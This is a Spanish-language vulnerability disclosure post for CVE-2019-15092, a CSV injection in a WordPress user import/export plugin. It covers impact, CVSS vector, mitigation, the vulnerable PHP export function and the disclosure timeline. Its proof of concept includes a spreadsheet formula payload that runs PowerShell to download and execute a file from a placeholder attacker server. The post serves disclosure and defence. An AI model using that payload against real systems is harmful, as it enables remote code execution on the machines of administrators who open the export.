+++
date = "2019-08-22"
title = "CVE-2019-15092 WordPress Plugin Import Export Users = 1.3.0 - CSV Injection"
author = "Javier Olmedo"
toc = false
+++

[![/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_banner.png](/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_banner.png)](/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_banner.png)

## Impacto

Un usuario malicioso conÂ **permisos bÃ¡sicos**Â de WordPress (suscriptor) podrÃ­aÂ **ejecutar comandos**Â en el equipo del administrador a travÃ©s deÂ **inyecciones CSV**Â en los camposÂ `display_name`,Â `first_name`Â yÂ `last_name`.

## CVSS v3.1 Vector

AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H

[![/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_001.png](/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_001.png)](/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_001.png)

[![/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_002.png](/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_002.png)](/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_002.png)

Calculadora de puntuaciÃ³n de vulnerabiliad comÃºn del NIST

## Prueba de concepto (PoC)

1. Iniciar sesiÃ³n con cualquier usuario (suscriptor) y cambiar los camposÂ `nombre`,Â `apellido`Â yÂ `alias`Â por el payload ğŸ’‰`=cmd|'/C powershell IEX(wget [SERVIDOR-ATACANTE]/shell.exe)'!A0`Â (Este payload ejecuta PowerShell en la mÃ¡quina del administrador para descargar y ejecutar un archivo desde un servidor malicioso).

[![/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_003.png](/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_003.png)](/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_003.png)

ModificaciÃ³n de campos en el panel de usuario de WordPress

2. Iniciar sesiÃ³n con usuario administrador yÂ **exportar los usuarios**Â mediante el uso del plugin.

3. Abrir elÂ **archivo generado**Â por el plugin, puede observarse el payload insertado en el paso 1.

[![/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_004.png](/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_004.png)](/images/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection_004.png)

Archivo CSV generado por el plugin

## MitigaciÃ³n

En el momento de generar el archivo CSV, verificar queÂ **ningÃºn campo comience**Â con los siguientes caracteres:

- Igual (=)
- Mas (+)
- Menos (-)
- Arroba (@)

## CÃ³digo vulnerable

La funciÃ³nÂ `do_export()`Â de la claseÂ `WF_CustomerImpExpCsv_Exporter`Â no comprueba si el primer carÃ¡cter de los campos coincide conÂ `(=, +, -, @)`

```php
public static function do_export() {
    global $wpdb;
 
    $export_limit = !empty($_POST['limit']) ? intval($_POST['limit']) : 999999999;
    $export_offset = !empty($_POST['offset']) ? intval($_POST['offset']) : 0;
    $csv_columns = include( 'data/data-wf-post-columns.php' );
    $user_columns_name = !empty($_POST['columns_name']) ? $_POST['columns_name'] : $csv_columns;
    $export_columns = !empty($_POST['columns']) ? $_POST['columns'] : array();
    $export_user_roles = !empty($_POST['user_roles']) ? $_POST['user_roles'] : array();
    $delimiter = !empty($_POST['delimiter']) ? $_POST['delimiter'] : ',';
 
    $wpdb-&amp;amp;amp;gt;hide_errors();
    @set_time_limit(0);
    if (function_exists('apache_setenv'))
        @apache_setenv('no-gzip', 1);
    @ini_set('zlib.output_compression', 0);
    @ob_end_clean();
 
    header('Content-Type: text/csv; charset=UTF-8');
    header('Content-Disposition: attachment; filename=Customer-Export-' . date('Y_m_d_H_i_s', current_time('timestamp')) . ".csv");
    header('Pragma: no-cache');
    header('Expires: 0');
 
    $fp = fopen('php://output', 'w');
 
    $args = array(
        'fields' =&amp;amp;amp;gt; 'ID', // exclude standard wp_users fields from get_users query -&amp;amp;amp;gt; get Only ID##
        'role__in' =&amp;amp;amp;gt; $export_user_roles, //An array of role names. Matched users must have at least one of these roles. Default empty array.
        'number' =&amp;amp;amp;gt; $export_limit, // number of users to retrieve
        'offset' =&amp;amp;amp;gt; $export_offset // offset to skip from list
    );
     
    $users = get_users($args);
 
    // Variable to hold the CSV data we're exporting
    $row = array();
 
    // Export header rows
    foreach ($csv_columns as $column =&amp;amp;amp;gt; $value) {
        $temp_head = esc_attr($user_columns_name[$column]);
        if (!$export_columns || in_array($column, $export_columns))
            $row[] = $temp_head;
    }
 
    $row = array_map('WF_CustomerImpExpCsv_Exporter::wrap_column', $row);
    fwrite($fp, implode($delimiter, $row) . "\n");
    unset($row);
 
    ini_set('max_execution_time', -1);
    ini_set('memory_limit', -1);
    // Loop users
    foreach ($users as $user) {
        //$row = array();   
        $data = WF_CustomerImpExpCsv_Exporter::get_customers_csv_row($user, $export_columns, $csv_columns);
        $row = array_map('WF_CustomerImpExpCsv_Exporter::wrap_column', $data);
        fwrite($fp, implode($delimiter, $row) . "\n");
        unset($row);
        unset($data);
    }
 
    fclose($fp);
    exit;
}
```

## TIME LINE

- 15, agosto 2019 â€“ ğŸ‘¨â€ğŸ’» Descubierta
- 15, agosto 2019 â€“ ğŸ‘¨â€ğŸ’» Reportado al soporte de Webtoffee
- 16, agosto 2019 â€“Â ğŸ‘¨â€ğŸ’¼ Solicitud de mÃ¡s informaciÃ³n
- 16, agosto 2019 â€“ ğŸ‘¨â€ğŸ’» Reporte detallado de vulnerabilidad
- 19, agosto 2019 â€“Â ğŸ‘¨â€ğŸ’¼ No reconocida la vulnerabilidad
- 22, agosto 2019 â€“ ğŸ‘¨â€ğŸ’» DivulgaciÃ³n pÃºblica